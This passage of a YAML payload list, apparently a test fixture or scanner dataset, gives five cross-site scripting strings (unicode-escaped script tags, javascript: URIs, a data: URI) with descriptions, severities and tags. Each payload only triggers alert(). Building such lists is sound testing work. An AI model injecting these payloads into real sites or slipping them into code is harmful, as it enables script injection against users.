    - value: "\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E"
      description: "Unicode escape encoded"
      severity: high
      tags: [encoded, unicode]

    - value: "javascript:alert(1)"
      description: "Javascript URI"
      severity: high
      tags: [encoded, javascript_uri]

    - value: "javascript:alert('XSS')"
      description: "Javascript URI with string"
      severity: high
      tags: [encoded, javascript_uri]

    - value: "javascript:alert`1`"
      description: "Javascript URI template literal"
      severity: high
      tags: [encoded, javascript_uri, template_literal]

    - value: "data:text/html,<script>alert(1)</script>"
      description: "Data URI XSS"
      severity: high
